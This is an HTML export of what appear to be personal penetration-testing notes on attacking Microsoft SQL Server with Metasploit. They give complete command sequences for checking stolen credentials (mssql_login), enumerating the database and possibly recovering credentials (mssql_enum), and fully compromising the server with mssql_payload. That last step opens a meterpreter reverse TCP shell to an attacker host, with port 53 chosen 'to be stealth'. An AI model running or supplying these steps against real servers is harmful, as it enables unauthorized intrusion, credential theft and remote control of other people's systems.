<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MSSQL database Metasploit exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MSSQL database Metasploit exploits</h1><br/><br /><br /><strong><h3>Test credentials SQL server</h3></strong><br />To test if some credentials(usename:password) are valid for login in the SQL server, we can use the Metasploit’s <strong>mssql_login</strong> module from the attacker machine<br /><div class="codebox"><pre>msfconsole<br />use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>scanner<span style="color:#ff9d00;font-weight:700">/</span>mssql<span style="color:#ff9d00;font-weight:700">/</span>mssql_login<br /><span style="color:#ff9d00;font-weight:700">set</span> rhosts &lt;ip-address-database&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> rport &lt;service-port-running-on-the-remote-machine&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> username &lt;username&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> password &lt;password&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> verbose <span style="color:#ff9d00;font-weight:700">true</span><br />run</pre></div><br /><br /><strong><h3>Informations about the database</h3></strong><br />through Metasploit’s <strong>mssql_enum</strong> module we can retrieve informations from the databse<br /><div class="codebox"><pre>use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>admin<span style="color:#ff9d00;font-weight:700">/</span>mssql<span style="color:#ff9d00;font-weight:700">/</span>mssql_enum<br /><span style="color:#ff9d00;font-weight:700">set</span> rhosts &lt;ip-address-database&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> rport &lt;service-port-running-on-the-remote-machine&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> username &lt;username&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> password &lt;password&gt;<br />run</pre></div><br />with this module sometime we can get also the credentials(username and password) of an account<br /><br /><strong><h3>Compromise the SQL Server</h3></strong><br />through Metasploit’s <strong>mssql_payload</strong> module we can fully compromise the SQL Server,<br /><div class="codebox"><pre>use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>mssql<span style="color:#ff9d00;font-weight:700">/</span>mssql_payload<br /><span style="color:#ff9d00;font-weight:700">set</span> rhosts &lt;ip-address-database&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> username &lt;username&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> password &lt;password&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> srvport 53   <span style="color:#0088ff;font-weight:400">#dns port to be stealth</span><br /><br /><span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>meterpreter_reverse_tcp<br /><span style="color:#ff9d00;font-weight:700">set</span> lhost &lt;local-host-of-the-attacker&gt;<br /><span style="color:#ff9d00;font-weight:700">set</span> lport 443<br />run</pre></div></div>
</body>
</html>
